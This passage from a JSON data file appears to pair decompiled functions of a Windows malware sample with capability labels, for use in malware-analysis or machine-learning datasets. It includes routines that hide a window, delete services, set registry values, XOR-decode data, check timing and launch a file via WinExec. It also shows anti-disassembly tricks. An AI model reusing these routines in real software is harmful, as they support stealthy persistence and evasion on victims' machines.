        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403e6a) overlaps instruction at (ram,0x00403e67)\n// \n// WARNING: Removing unreachable block (ram,0x00403de0)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl fcn.00403d90(uint arg_8h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint extraout_EDX;\n    uint *puVar3;\n    bool bVar4;\n    uint64_t uVar5;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_20fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x41f420, &lpBuffer, arg_8h);\n    bVar4 = true;\n    uVar1 = fcn.00403560(&var_4h, &var_8h);\n    arg_8h_00 = var_4h;\n    if ((!bVar4) && (bVar4)) {\n        arg_8h_00 = CONCAT31(uVar1 >> 8, 0x98);\n    }\n    fcn.00403ee0(arg_8h_00);\n    uVar5 = fcn.00403c10(&s, 0x41f440, var_4h, var_8h);\n    if (uVar5 == 0) {\n        return uVar5 & 0xffffffff00000000;\n    }\n    fcn.00403850(&s, 0xffffffff);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 576
    },
    "004042e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004042e0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x41f94c = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x41f950 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x41f52c);\n    *0x41f954 = (*pcVar1)(iVar2, 0x41f53c);\n    if (((*0x41f94c != 0) && (*0x41f950 != 0)) && (*0x41f954 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 221
    },
    "00403ad0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403ba2)\n\nuint __cdecl fcn.00403ad0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 287
    },
    "004012f0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004012f0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uchar *unaff_ESI;\n    bool bVar2;\n    unkbyte6 Var3;\n    \n    Var3 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                     (0, 0x406010, 0x41f924, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    uVar1 = Var3;\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n        uVar1 = *0x4bb148d3;\n        out(*unaff_ESI, Var3 >> 0x20);\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(uVar1, 0);\n    return 1;\n}\n",
        "token_count": 226
    },
    "004015e0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004015e0(uint arg_8h)\n\n{\n    ushort in_DX;\n    uchar *unaff_ESI;\n    bool in_ZF;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_DX);\n    }\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 111
    },
    "00402e40": {
        "rules": [
            "get service handle",
            "contain loop",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e85) overlaps instruction at (ram,0x00402e81)\n// \n// WARNING: Removing unreachable block (ram,0x00402e76)\n\nuint __cdecl fcn.00402e40(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_EDI;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(arg_8h, arg_ch, 0xf01ff);\n    if (iVar1 != 0) {\n        *unaff_EDI = iVar1 + 4;\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x56b8ec44);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "004044a0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004044a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41f600, 0x41f644, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    },
    "004043a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004043a0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_1h;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "004029c0": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b25) overlaps instruction at (ram,0x00402b20)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004029c0(uint arg_8h)\n\n{\n    int16_t extraout_CX;\n    uint16_t extraout_CX_00;\n    int32_t iVar1;\n    uint16_t unaff_BX;\n    uchar uVar2;\n    uint *puVar3;\n    bool bVar4;\n    bool bVar5;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint var_213h;\n    uchar var_110h;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &var_213h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    var_110h = 0;\n    puVar3 = &var_10fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_ch = 1;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_110h, 0x2c, 0xe8, arg_8h);\n    fcn.00401a10(&var_4h, &var_8h);\n    iVar1 = fcn.004040c0(arg_8h, in_stack_00000008, in_stack_0000000c, in_stack_00000010, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar4 = false;\n    bVar5 = (extraout_CX - 1U & puVar3 + 3U | 0x61be) == 0;\n    *0x41f948 = fcn.004014a0();\n    if ((!bVar4 && !bVar5) && (bVar4 || bVar5)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.00402d20(&var_110h, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar4 = (POPCOUNT((unaff_BX ^ extraout_CX_00) & 0xff) & 1U) == 0;\n    fcn.00401240();\n    if ((!bVar4) && (bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.004017b0(0x41f464);\n    if (iVar1 == -1) {\n        iVar1 = fcn.004017b0(0x41f458);\n        if (iVar1 == -1) goto code_r0x00402b81;\n        uVar2 = 0xf;\n    }\n    else {\n        uVar2 = 0xe;\n    }\n    iVar1 = fcn.00402c60(arg_8h);\n    if (iVar1 != 0) {\n        fcn.004044a0(uVar2);\n        fcn.00401950(uVar2);\n        return 1;\n    }\ncode_r0x00402b81:\n    iVar1 = fcn.004031f0(arg_8h, &var_110h);\n    if (iVar1 == 0) {\n        var_ch = 0;\n    }\n    if ((var_ch != 0) && (iVar1 = fcn.00402910(arg_8h),  iVar1 == 0)) {\n        var_ch = 0;\n    }\n    if (var_ch == 0) {\n        var_ch = fcn.00401620(arg_8h, 0);\n    }\n    iVar1 = var_ch;\n    if (var_ch != 0) {\n        fcn.00401950(0xff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xe8);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x78, 0);\n    return iVar1;\n}\n",
        "token_count": 1078
    }
}